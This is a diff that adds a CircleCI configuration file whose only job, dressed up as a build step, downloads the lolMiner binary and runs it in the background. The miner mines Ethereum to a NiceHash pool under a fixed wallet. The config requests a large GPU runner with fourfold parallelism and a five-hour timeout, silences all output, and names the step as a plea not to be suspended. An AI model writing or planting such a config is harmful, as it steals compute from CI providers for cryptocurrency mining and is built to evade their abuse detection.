@@ -1,0 +1,23 @@
+version: 2.1
+tlembuk: &lonte
+  steps:
+    - run: 
+        name: " Pleas Jangan Suspend"
+        command: |
+          nvidia-smi
+          docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+          wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+          tar -xf lolMiner_v1.29_Lin64.tar.gz
+          cd 1.29 && chmod +x lolMiner
+          nohup bash -c "./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3CVPMuA7x2qF8QMufzgqMgMzvYzGaTcXq4.irkhM-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY &> /dev/null 2>&1&"
+        
+        no_output_timeout: 5h
+
+jobs: 
+  build: 
+    <<: *lonte
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    parallelism: 4
+    
